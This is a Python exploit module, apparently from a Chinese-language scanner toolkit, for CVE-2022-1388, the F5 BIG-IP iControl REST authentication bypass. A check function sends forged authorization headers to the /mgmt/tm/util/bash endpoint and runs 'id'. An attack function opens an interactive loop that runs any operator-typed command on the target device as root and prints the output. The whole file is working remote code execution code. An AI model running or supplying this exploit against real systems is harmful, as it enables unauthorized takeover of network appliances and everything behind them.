import requests
import urllib, re

def verify(url):
    relsult = {
        'name': 'CVE-2022-1388 F5-BIGIP iControl REST绕过授权访问漏洞',
        'vulnerable': False,
        'attack': True,
        'url': url,
        'about': 'https://github.com/horizon3ai/CVE-2022-1388/blob/main/CVE-2022-1388.py, '
                 'https://github.com/0xf4n9x/CVE-2022-1388/blob/main/CVE-2022-1388.py',
    }
    headers = {
        'Host': '127.0.0.1',
        'Authorization': 'Basic YWRtaW46aG9yaXpvbjM=',
        'X-F5-Auth-Token': 'asdf',
        'Connection': 'X-F5-Auth-Token',
        'Content-Type': 'application/json'

    }
    cmd = 'id'
    try:
        vurl = urllib.parse.urljoin(url, '/mgmt/tm/util/bash')
        j = {"command": "run", "utilCmdArgs": "-c '{0}'".format(cmd)}
        rep = requests.post(vurl, headers=headers, json=j, verify=False, timeout=5)
        if rep.status_code == 200 and re.search('commandResult', rep.text) and re.search('tm:util:bash:runstate', rep.text):
            relsult['vulnerable'] = True
            relsult['url'] = url
            relsult['about'] = 'https://github.com/horizon3ai/CVE-2022-1388/blob/main/CVE-2022-1388.py, ' \
                               'https://github.com/0xf4n9x/CVE-2022-1388/blob/main/CVE-2022-1388.py'
            return relsult
        else:
            return relsult
    except:
        return relsult

def attack(url):

    headers = {
        'Authorization': 'Basic YWRtaW46aG9yaXpvbjM=',
        'X-F5-Auth-Token': 'asdf',
        'Connection': 'X-F5-Auth-Token',
        'Content-Type': 'application/json'

    }
    print('[+] 开始执行命令(输入exit退出)!')
    cmd = ''
    try:
        while cmd != 'exit':
            cmd = input('[+] 执行命令 > ')
            try:
                vurl = urllib.parse.urljoin(url, '/mgmt/tm/util/bash')
                j = {"command": "run", "utilCmdArgs": "-c '{0}'".format(cmd)}
                rep = requests.post(vurl, headers=headers, json=j, verify=False, timeout=3)
                if rep.status_code == 200 and re.search('commandResult', rep.text) and re.search('tm:util:bash:runstate', rep.text):
                    output = rep.json()['commandResult']
                    print('[+] 执行结果: ', output)
            except:
                print('[+] 执行超时，请检查是否成功?')
                pass
        return True
    except:
        return False